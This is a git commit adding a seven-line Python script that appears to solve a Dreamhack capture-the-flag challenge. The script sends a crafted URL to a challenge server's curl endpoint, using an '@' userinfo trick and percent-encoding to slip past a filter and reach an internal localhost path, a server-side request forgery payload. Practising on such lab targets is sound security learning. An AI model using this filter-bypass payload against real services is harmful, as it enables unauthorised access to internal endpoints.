b151927e61901e57d1dfccc3c5090dde06190deb
JH0814 <40225003+JH0814@users.noreply.github.com>
2025-02-23 10:58:41 +0900

    Add files via upload

---
+++ curling/curling.py
@@ -0,0 +1,7 @@
+import requests
+
+url = "http://host1.dreamhack.games:9407"
+fir_url = url + "/api/v1/test/curl"
+data = {'url':'http://dreamhack.io@localhost:8000/api/v1/test/interna%6c'}
+res = requests.post(fir_url, data=data)
+print(res.text)
